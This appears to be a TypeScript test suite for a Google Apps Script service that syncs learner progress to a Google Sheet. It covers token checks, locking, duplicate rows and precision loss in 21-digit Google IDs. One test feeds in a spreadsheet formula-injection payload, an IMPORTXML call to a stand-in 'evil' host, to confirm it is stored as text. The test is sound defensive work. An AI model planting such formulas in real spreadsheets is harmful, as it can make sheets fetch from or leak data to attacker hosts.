import { readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { test, expect } from '../support/test';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const source = readFileSync(path.join(root, 'server/sheets/Progress.gs'), 'utf8');
const { rowFromProgress, progressFromRow, emptyProgress } = new Function(
  `${source}; return { rowFromProgress, progressFromRow, emptyProgress };`,
)() as {
  rowFromProgress: (sub: string, progress: Record<string, unknown>) => unknown[];
  progressFromRow: (row: unknown[]) => Record<string, unknown>;
  emptyProgress: () => Record<string, unknown>;
};

function harness(properties: Record<string, string | null>) {
  const globals = `
    var PropertiesService = {
      getScriptProperties: function () {
        return { getProperty: function (k) { return ${JSON.stringify(properties)}[k] || null; } };
      },
    };
  `;
  const built = new Function(
    `${globals}; ${source}; return { authorized: authorized, rowIndexFor: rowIndexFor, untext: untext };`,
  )() as {
    authorized: (body: unknown) => boolean;
    rowIndexFor: (tab: unknown, sub: string) => number;
    untext: (v: unknown) => string;
  };
  return {
    // The token now travels in the parsed POST body (`body.token`), not a
    // query-string parameter — see the fix-round-1 report for why.
    authorizedWith: (token: string) => built.authorized({ token }),
    rowIndexForIn: (column: string[][], sub: string) =>
      built.rowIndexFor(
        {
          getLastRow: () => column.length + 1,
          // Apps Script refuses a range of fewer than one row, so this stub
          // does too: a header-only tab must never reach `getRange` at all.
          getRange: (_row: number, _col: number, numRows: number) => {
            if (!(numRows >= 1)) {
              throw new Error('The number of rows in the range must be at least 1.');
            }
            return { getValues: () => column };
          },
        },
        sub,
      ),
  };
}

const HEADERS = [
  'google_sub',
  'resume_started',
  'resume_completed',
  'interview_started',
  'interview_answers',
  'interview_completed',
  'practice_completed',
  'lectures_viewed',
  'last_tool',
  'updated_at',
];

/**
 * What a Sheets cell does to a value on the way in, which is the whole of the
 * corruption this file now pins down. A bare decimal string is *parsed as a
 * number*: a 21-digit Google `sub` exceeds IEEE-754 precision, so it reads
 * back as `110169484474386280000` and matches nothing ever again. A leading
 * apostrophe forces text, and the apostrophe is consumed as that marker
 * rather than stored as part of the value.
 */
function coerce(value: unknown): unknown {
  if (typeof value !== 'string') return value;
  if (value.charAt(0) === "'") return value.slice(1);
  if (value !== '' && /^-?\d+(\.\d+)?$/.test(value)) return Number(value);
  return value;
}

/**
 * `doPost` needs its own harness: it touches `LockService`, `SpreadsheetApp`
 * and `ContentService`, and the lock/write assertions below need real call
 * tracking, not just data a mock can report back — so this passes live JS
 * objects into the built function instead of splicing JSON into the source.
 *
 * The sheet is modelled as one grid whose first row is the header, because two
 * of the defects this file guards live exactly where a happy-path mock would
 * have papered over the platform: `getRange` refuses `numRows < 1` the way
 * Apps Script does, and every write goes through `coerce`.
 */
function harnessDoPost(options: {
  properties?: Record<string, string | null>;
  tryLockResult?: boolean;
  rows?: unknown[][];
  tabMissing?: boolean;
}) {
  const properties = options.properties ?? { ACADEMY_TOKEN: 't'.repeat(40) };
  const tryLockResult = options.tryLockResult ?? true;
  // A tab that exists carries the header row; a missing one is created by `sheet()`.
  const grid: unknown[][] = options.tabMissing
    ? []
    : [[...HEADERS], ...(options.rows ?? []).map(row => row.map(coerce))];

  const released = { called: false };
  const lockCalls = { tryLock: 0, waitedFor: [] as number[] };
  const appendCalls: unknown[][] = [];
  const setValuesCalls: { row: number; values: unknown[][] }[] = [];
  const numberFormats: { row: number; column: number; numRows: number; format: string }[] = [];
  const inserted: string[] = [];

  const tab = {
    getLastRow: () => grid.length,
    getMaxRows: () => Math.max(grid.length, 1000),
    getRange: (row: number, col: number, numRows: number, numCols: number) => {
      // Apps Script's own rule, and its own message. A range of zero rows is
      // not an empty read there — it throws.
      if (!(numRows >= 1)) throw new Error('The number of rows in the range must be at least 1.');
      if (!(numCols >= 1))
        throw new Error('The number of columns in the range must be at least 1.');
      return {
        getValues: () =>
          grid
            .slice(row - 1, row - 1 + numRows)
            .map(r =>
              r.slice(col - 1, col - 1 + numCols).map(cell => (cell === undefined ? '' : cell)),
            ),
        setValues: (values: unknown[][]) => {
          setValuesCalls.push({ row, values });
          values.forEach((line, i) => {
            grid[row - 1 + i] = line.map(coerce);
          });
        },
        setNumberFormat: (format: string) => {
          numberFormats.push({ row, column: col, numRows, format });
        },
      };
    },
    appendRow: (row: unknown[]) => {
      appendCalls.push(row);
      grid.push(row.map(coerce));
    },
  };

  const deps = {
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k: string) => properties[k] ?? null,
      }),
    },
    LockService: {
      getScriptLock: () => ({
        tryLock: (ms: number) => {
          lockCalls.tryLock += 1;
          lockCalls.waitedFor.push(ms);
          return tryLockResult;
        },
        releaseLock: () => {
          released.called = true;
        },
      }),
    },
    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput: (contents: string) => ({
        content: contents,
        setMimeType() {
          return this;
        },
      }),
    },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: () => (options.tabMissing && inserted.length === 0 ? null : tab),
        insertSheet: (name: string) => {
          inserted.push(name);
          return tab;
        },
      }),
    },
  };

  const built = new Function(
    'deps',
    `
      var PropertiesService = deps.PropertiesService;
      var LockService = deps.LockService;
      var ContentService = deps.ContentService;
      var SpreadsheetApp = deps.SpreadsheetApp;
      ${source};
      return { doPost: doPost };
    `,
  )(deps) as { doPost: (e: unknown) => { content: string } };

  return {
    doPostRaw: built.doPost,
    doPostBody: (e: unknown) => JSON.parse(built.doPost(e).content),
    released,
    lockCalls,
    appendCalls,
    setValuesCalls,
    numberFormats,
    inserted,
    grid,
  };
}

test('a row round-trips back to the same progress', () => {
  const progress = {
    ...emptyProgress(),
    interviewAnswers: 4,
    practiceCompleted: ['c1', 'c2'],
    lastTool: 'practice',
  };
  expect(progressFromRow(rowFromProgress('123', progress))).toEqual(progress);
});

/**
 * The two lists come from localStorage, which the visitor owns. An id like
 * `=IMPORTXML(...)` written into a cell is a formula Google will evaluate.
 */
test('an id that looks like a formula is stored as text, not evaluated', () => {
  const row = rowFromProgress('123', {
    ...emptyProgress(),
    practiceCompleted: ['=IMPORTXML("http://evil","//a")'],
  });
  row.forEach(cell => {
    if (typeof cell === 'string' && cell.length > 0) {
      expect(cell.startsWith('=')).toBe(false);
    }
  });
});

test('a sub that looks like a formula is stored as text', () => {
  const row = rowFromProgress('=1+1', emptyProgress());
  expect(row[0]).toBe("'=1+1");
});

/** The web app is deployed "anyone with the link": the token is the only guard. */
test('an absent script token refuses every caller', () => {
  const { authorizedWith } = harness({ ACADEMY_TOKEN: null });
  expect(authorizedWith('')).toBe(false);
  expect(authorizedWith('t'.repeat(40))).toBe(false);
});

test('a short script token is refused rather than trusted', () => {
  const { authorizedWith } = harness({ ACADEMY_TOKEN: 'short' });
  expect(authorizedWith('short')).toBe(false);
});

test('only the exact token is accepted', () => {
  const token = 't'.repeat(40);
  const { authorizedWith } = harness({ ACADEMY_TOKEN: token });
  expect(authorizedWith(token)).toBe(true);
  expect(authorizedWith('x'.repeat(40))).toBe(false);
  expect(authorizedWith(token.slice(0, 39))).toBe(false);
});

/** A hand-edited sheet can hold two rows for one sub. Picking one silently
 *  would write a merge into a row the next read might not find. */
test('duplicate rows for one sub are an error, not a coin toss', () => {
  const { rowIndexForIn } = harness({});
  expect(() => rowIndexForIn([['123'], ['456'], ['123']], '123')).toThrow();
  expect(rowIndexForIn([['456'], ['123']], '123')).toBe(3);
  expect(rowIndexForIn([['456']], '123')).toBe(-1);
});

const TOKEN = 't'.repeat(40);

/**
 * The lock is the only thing standing between two concurrent syncs and a
 * corrupted row — it is the entire reason this uses Apps Script instead of
 * the Sheets REST API, so a lock that is not granted must never be treated
 * as though it were.
 */
test('a lock that is not granted refuses the write rather than falling through', () => {
  const { doPostBody, appendCalls, setValuesCalls, released, lockCalls } = harnessDoPost({
    tryLockResult: false,
  });
  const body = doPostBody({
    postData: {
      contents: JSON.stringify({
        token: TOKEN,
        sub: '123',
        op: 'merge',
        progress: { ...emptyProgress(), resumeStarted: true },
      }),
    },
  });
  expect(body).toEqual({ error: 'busy' });
  expect(appendCalls).toHaveLength(0);
  expect(setValuesCalls).toHaveLength(0);
  expect(lockCalls.tryLock).toBe(1);
  // The lock was never granted, so there is nothing to release.
  expect(released.called).toBe(false);
});

test('the lock is released even when the locked work throws', () => {
  const { doPostRaw, released } = harnessDoPost({
    // Two rows for '123' makes rowIndexFor throw once inside the try block —
    // a stand-in for any failure that can happen mid-write, proving the
    // finally protects the lock regardless of cause.
    rows: [['123'], ['456'], ['123']],
  });
  const e = {
    postData: {
      contents: JSON.stringify({
        token: TOKEN,
        sub: '123',
        op: 'merge',
        progress: emptyProgress(),
      }),
    },
  };
  expect(() => doPostRaw(e)).toThrow();
  expect(released.called).toBe(true);
});

test('a load for an unknown sub returns empty progress and writes nothing', () => {
  const { doPostBody, appendCalls, setValuesCalls, released } = harnessDoPost({ rows: [] });
  const body = doPostBody({
    postData: { contents: JSON.stringify({ token: TOKEN, sub: 'never-seen', op: 'load' }) },
  });
  expect(body).toEqual({ progress: emptyProgress() });
  expect(appendCalls).toHaveLength(0);
  expect(setValuesCalls).toHaveLength(0);
  expect(released.called).toBe(true);
});

/**
 * A token in a query string lands in Google's execution logs and any proxy
 * log along the way; the body `doPost` already parses is the only place
 * left for it to travel.
 */
test('a malformed body is refused before the lock is ever touched', () => {
  const { doPostBody, lockCalls } = harnessDoPost({});
  const body = doPostBody({ postData: { contents: '{not valid json' } });
  expect(body).toEqual({ error: 'unauthorized' });
  expect(lockCalls.tryLock).toBe(0);
});

test('only a token carried in the body authorizes the request', () => {
  const { doPostBody } = harnessDoPost({ rows: [] });
  const body = doPostBody({
    postData: { contents: JSON.stringify({ token: 'x'.repeat(40), sub: '123', op: 'load' }) },
  });
  expect(body).toEqual({ error: 'unauthorized' });
});

/**
 * A real Google `sub` is a ~21-digit decimal string. Written bare into a cell
 * Sheets parses it as a number, which loses the tail to IEEE-754 — so the row
 * can never be found again, every sync appends another one, and every load
 * answers `emptyProgress()` that `ProgressContext.adopt` then writes over the
 * learner's real `localStorage`. The sub column is therefore forced to text
 * unconditionally, not only when it looks like a formula.
 */
const REAL_SUB = '110169484474386276334';

function post(body: Record<string, unknown>) {
  return { postData: { contents: JSON.stringify({ token: TOKEN, ...body }) } };
}

test('a 21-digit Google sub is written as text, not as a number that loses its tail', () => {
  const row = rowFromProgress(REAL_SUB, emptyProgress());
  expect(row[0]).toBe("'" + REAL_SUB);
  expect(coerce(row[0])).toBe(REAL_SUB);
});

test('a second merge for a real sub updates the row instead of appending another', () => {
  const h = harnessDoPost({ rows: [] });

  const first = h.doPostBody(
    post({ sub: REAL_SUB, op: 'merge', progress: { ...emptyProgress(), resumeStarted: true } }),
  );
  expect(first.progress.resumeStarted).toBe(true);
  expect(h.appendCalls).toHaveLength(1);
  // The stored cell survived Sheets' coercion as the exact digits.
  expect(h.grid[1][0]).toBe(REAL_SUB);

  const second = h.doPostBody(
    post({ sub: REAL_SUB, op: 'merge', progress: { ...emptyProgress(), interviewStarted: true } }),
  );
  expect(h.appendCalls).toHaveLength(1);
  expect(h.setValuesCalls).toHaveLength(1);
  expect(second.progress.resumeStarted).toBe(true);
  expect(second.progress.interviewStarted).toBe(true);
});

test('a load after a sync returns the stored progress rather than erasing it', () => {
  const h = harnessDoPost({ rows: [] });
  h.doPostBody(
    post({
      sub: REAL_SUB,
      op: 'merge',
      progress: { ...emptyProgress(), practiceCompleted: ['c1'], lastTool: 'practice' },
    }),
  );

  const loaded = h.doPostBody(post({ sub: REAL_SUB, op: 'load' }));

  expect(loaded.progress.practiceCompleted).toEqual(['c1']);
  expect(loaded.progress.lastTool).toBe('practice');
});

/**
 * Apps Script requires `numRows >= 1`. A tab `sheet()` has just created holds
 * only the header row, so `getLastRow() - 1` is 0 and the range throws — the
 * first request after deployment, every time, and it never self-clears.
 */
test('a tab holding only its header row is scanned without asking for zero rows', () => {
  const { rowIndexForIn } = harness({});
  expect(rowIndexForIn([], REAL_SUB)).toBe(-1);
});

test('the first request against a freshly created tab answers instead of throwing', () => {
  const h = harnessDoPost({ tabMissing: true });

  const body = h.doPostBody(post({ sub: REAL_SUB, op: 'load' }));

  expect(body).toEqual({ progress: emptyProgress() });
  expect(h.inserted).toEqual(['learner_progress']);
  expect(h.appendCalls[0]).toEqual(HEADERS);
  // Plain text on the sub column, so a hand-typed sub behaves like a written one.
  expect(h.numberFormats.some(f => f.column === 1 && f.format === '@')).toBe(true);
});

/**
 * The lock's wait budget has to stay meaningfully under `sheets_store.TIMEOUT`,
 * or the client's `ReadTimeout` and the script's own giving-up land together —
 * the caller reads a 500 and discards a union that was written, and the
 * designed `{"error":"busy"}` signal can never be observed.
 */
test('the lock gives up well before the HTTP client does', () => {
  const h = harnessDoPost({ rows: [] });
  h.doPostBody(post({ sub: REAL_SUB, op: 'load' }));
  expect(h.lockCalls.waitedFor).toHaveLength(1);
  expect(h.lockCalls.waitedFor[0]).toBeLessThanOrEqual(12000);
});

/** `doPost` used to special-case only `load`, so anything else — including a
 *  request with no `op` at all — merged `emptyProgress()` in and wrote it. */
test('an op that is neither load nor merge is refused rather than written', () => {
  for (const body of [{ sub: REAL_SUB }, { sub: REAL_SUB, op: 'delete' }]) {
    const h = harnessDoPost({ rows: [] });
    expect(h.doPostBody(post(body))).toEqual({ error: 'unknown op' });
    expect(h.appendCalls).toHaveLength(0);
    expect(h.setValuesCalls).toHaveLength(0);
  }
});
